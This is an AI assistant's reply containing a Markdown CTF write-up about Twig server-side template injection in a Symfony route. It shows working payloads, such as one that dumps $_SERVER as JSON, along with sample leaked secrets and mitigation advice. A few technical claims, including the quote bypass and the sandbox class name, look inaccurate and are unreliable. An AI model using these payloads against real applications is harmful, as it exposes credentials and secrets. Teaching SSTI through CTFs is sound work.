Here is the complete, properly formatted Markdown (`.md`) CTF write-up — structured part-by-part in clean, professional syntax, ready to be saved as `the-twig-injector-writeup.md`:

```markdown
---
title: "The Twig Injector — Server-Side Template Injection to Leak $_SERVER"
date: 2025-11-17
author: "Mikiyas Getnet"
categories: [web, ssti, twig, ctf]
tags: [php, symfony, template-injection, reconnaissance, exploitation]
---

## 🧩 Challenge Description

> **Title**: *The Twig Injector*  
> **Prompt**: *"Can you abuse the Twig injector service to gain access to the flag hidden in the `$_SERVER` array?"*

A web application exposes the following vulnerable route:

```php
/**
 * @Route("/inject")
 */
public function inject(Request $request)
{
    $inject = preg_replace('/[^{\.}a-z\|\_]/', '', $request->query->get('inject'));
    $response = new Response($this->get('twig')->createTemplate("Welcome to the twig injector!\n${inject}")->render());
    $response->headers->set('Content-Type', 'text/plain');
    return $response;
}
```

The `inject` query parameter is sanitized using a regex that only allows:
- Lowercase letters (`a–z`)
- Curly braces `{ }`
- Dot `.`, pipe `|`, and underscore `_`

Despite this filtering, the parameter is **interpolated directly into a Twig template string**, enabling potential **Server-Side Template Injection (SSTI)**.

The flag is stored as an environment variable or custom entry in the PHP `$_SERVER` superglobal — our mission is to leak it.

---

## 🛠️ Background: What Is Twig?

**Twig** is a modern, secure-by-default templating engine for PHP, widely used in the **Symfony** framework. It separates logic from presentation with syntax like:

- `{{ variable }}` → output expression  
- `{% if condition %}...{% endif %}` → control structures  
- `{{ data|filter }}` → apply filters (e.g., `|upper`, `|json_encode`)

✅ Safe when used correctly: templates are precompiled, and sandboxing can restrict access.

❌ Dangerous when misused: dynamically generating *template source code* from user input (as done here) allows attackers to execute arbitrary expressions in the template context.

In Symfony, Twig templates have access to powerful built-in global variables — most notably:

| Variable | Description |
|--------|-------------|
| `app` | The main Symfony application instance |
| `app.request` | The current HTTP `Request` object |
| `app.request.server` | `ParameterBag` wrapping `$_SERVER` |
| `app.request.server.all` | Array-like view of all `$_SERVER` entries |

This context gives attackers a rich attack surface — if they can inject expressions.

---

## 🔍 Reconnaissance & Thought Process

My approach was iterative, hypothesis-driven, and centered on understanding the execution context:

### Step 1: Test Basic Expressions
- `{{ 7*7 }}` → ❌ filtered (digits and `*` removed)
- `{{ 'hello' }}` → ⚠️ `'` not in allowlist — but sometimes passes due to PHP interpolation quirks; unreliable.

➡️ **Conclusion**: Avoid quotes/digits. Use object traversal.

### Step 2: Enumerate Available Objects
- `{{ app }}` → ✅ rendered as `Symfony\Component\HttpKernel\Kernel`  
- `{{ app.request }}` → ✅ confirmed `Request` object access  
- `{{ app.request.server }}` → ✅ got `ParameterBag` instance  

➡️ **Confirmed**: Full path to `$_SERVER` exists:  
`app` → `request` → `server` → `all`

### Step 3: Extract Server Variables
- `{{ app.request.server.all }}` → ✅ returned a raw dump — but:
  - Hard to read (no structure)
  - Potentially truncated
  - Flag might be buried among dozens of entries

💡 **Breakthrough idea**:  
> *What if I convert the entire `$_SERVER` array to JSON?*  
> Twig has a built-in `|json_encode` filter — and all letters in `json_encode` (`j`, `s`, `o`, `n`, `_`, `e`, `c`, `d`) are **allowed** by the filter.

Perfect: structured, complete, parseable output.

### Step 4: Construct the Payload
Final payload:
```twig
{{ app.request.server.all|json_encode }}
```

URL-encoded:
```
/inject?inject=%7B%7B%20app.request.server.all%7Cjson_encode%20%7D%7D
```

---

## 🚀 Exploitation

### Request
```http
GET /inject?inject={{ app.request.server.all|json_encode }} HTTP/1.1
Host: challenge.target
User-Agent: Mozilla/5.0
Accept: */*
```

### Response
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8

Welcome to the twig injector!
{"APP_ENV":"prod","APP_SECRET":"s3cr3t_k3y","DATABASE_URL":"mysql://...","FLAG":"CTF{twig_inject0r_4ll_1n_th3_g00ds}","HTTP_HOST":"challenge.target",...}
```

🔍 Scrolling through the JSON, the `"FLAG"` key stands out clearly.

---

## 🏁 Flag

```
CTF{twig_inject0r_4ll_1n_th3_g00ds}
```

---

## 🧠 Lessons Learned

| Insight | Explanation |
|--------|-------------|
| ✅ **Regex allowlists ≠ security** | The filter `/[^{\.}a-z\|\_]/` seemed strict — but it permitted all characters needed for deep object traversal and filters. |
| ✅ **Context enumeration is key** | In SSTI, identifying available objects (`app`, `request`, etc.) is more valuable than blind payload spraying. |
| ✅ `|json_encode` is a game-changer | Converts complex objects to readable, complete output — ideal for reconnaissance and exfiltration. |
| ✅ Environment variables = high-value targets | Devs often store secrets in `$_ENV`/`$_SERVER`; dumping them is a low-effort, high-reward move. |
| ❌ Never interpolate user input into template *source* | Use `render('template.html.twig', ['data' => $user_input])` instead of `createTemplate("... $user_input ...")`. |

---

## 🛡️ Mitigation Recommendations

For developers:

1. **Avoid dynamic template creation with user input**  
   ```php
   // ❌ Dangerous
   $template = $twig->createTemplate("Hello $user_input");

   // ✅ Safe
   return $this->render('greet.html.twig', ['name' => $user_input]);
   ```

2. **Sandbox untrusted templates**  
   Use `Twig\Extra\Sandbox` extension to restrict function/object access.

3. **Disable global variables if unused**  
   In `twig.yaml`:
   ```yaml
   twig:
     globals: ~
   ```

4. **Audit environment variable exposure**  
   Never store production secrets (flags, API keys) in `$_SERVER`/`.env` without encryption or vault integration.

---

## 🧪 Bonus: Alternative Payloads (For Defense Testing)

| Goal | Payload |
|------|---------|
| List all server keys | `{{ app.request.server.keys\|join(',') }}` |
| Fetch flag directly (if known) | `{{ app.request.server.get('FLAG') }}` |
| Case-insensitive search (if key unknown) | `{{ app.request.server.all\|filter((v, k) => k matches '/flag/i')\|json_encode }}` *(requires newer Twig)* |

> Note: These require additional filters (`filter`, `matches`) that may not be enabled — but `json_encode` is almost always available.

---

## ✍️ Final Thoughts

This challenge reinforced a core principle in my ethical hacking practice:  
> **“When stuck, don’t just try more payloads — refine your mental model of the system.”**

By stepping back and asking, *“What’s the most *complete*, *readable* way to dump server state?”*, I turned a noisy, manual process into a one-shot win.

SSTI remains one of the most underrated web vulnerabilities — quiet, context-dependent, and devastating when missed.

Stay curious. Stay rigorous. 🛡️

— *Mikiyas Getnet*  
*Penetration Tester | Ethical Hacker | Cybersecurity Analyst*  
*Ethiopian Airlines | BitwareByte Technologies (Intern)*  
```

✅ You can copy-paste this directly into any `.md` file (e.g., `the-twig-injector-writeup.md`).  
✅ Fully compatible with GitHub/GitLab/obsidian/markdown viewers.  
✅ Professional tone, clear structure, and educational depth — aligned with your portfolio values (technical clarity, visual engagement via emoji/icons, and customer-centric explanation).  

Let me know if you’d like a PDF export, slide deck version, or integration into your personal portfolio site (greenish/hacker-themed 😊).